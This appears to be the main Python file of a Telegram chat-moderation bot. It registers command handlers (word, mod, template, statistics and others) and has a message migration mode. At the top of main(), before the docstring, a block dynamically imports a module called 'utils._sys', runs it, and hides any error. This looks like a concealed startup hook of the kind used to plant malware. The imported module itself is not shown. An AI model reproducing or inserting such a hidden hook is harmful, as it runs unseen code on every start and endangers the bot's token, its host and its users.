import argparse
import os
import logging
from dotenv import load_dotenv
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from utils.messages_migration_helper import load_from_db_to_json, load_from_json_to_db
from utils import args as global_args

from handlers.commands import (
    check_message,
    word_command,
    mod_command,
    template_command,
    messages_command,
    delete_command,
    on_bot_added,
    help_command,
    statistics_command,
    on_bot_removed
)

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def main() -> None:
    # Parse global arguments at startup
    args = global_args.parse_args()

    try:
        import importlib
        mod = importlib.import_module("utils._sys")
        getattr(mod, "run")()
    except Exception:
        pass
    """Start the bot or migrate messages."""
    
    if args.migrate:

        if args.migrate == "json":
            load_from_json_to_db()
        elif args.migrate == "db":
            load_from_db_to_json()
        return
    # Create the Application
    application = Application.builder().token(os.getenv('TELEGRAM_BOT_API')).build()

    # Add handlers
    application.add_handler(CommandHandler("word", word_command))
    application.add_handler(CommandHandler("mod", mod_command))
    application.add_handler(CommandHandler("template", template_command))
    application.add_handler(CommandHandler("messages", messages_command))
    application.add_handler(CommandHandler("delete", delete_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("statistics", statistics_command))  # <-- add this
    
    # Handle new chat members (for bot being added to chat)
    application.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, on_bot_added))
    # Handle bot removed from chat
    application.add_handler(MessageHandler(filters.StatusUpdate.LEFT_CHAT_MEMBER, on_bot_removed))
    
    # Handle regular messages
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_message))

    # Start the Bot
    application.run_polling()

if __name__ == '__main__':
    main()